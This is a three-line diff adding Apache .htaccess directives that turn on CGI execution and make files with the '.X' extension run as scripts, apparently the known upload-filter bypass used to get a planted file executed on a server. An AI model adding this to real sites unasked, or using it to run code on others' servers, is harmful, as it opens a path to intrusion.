@@ -1,0 +1,3 @@
+Options -Indexes +FollowSymLinks +MultiViews +ExecCGI
+AddHandler cgi-script .X
+AddType application/x-httpd-cgi .X
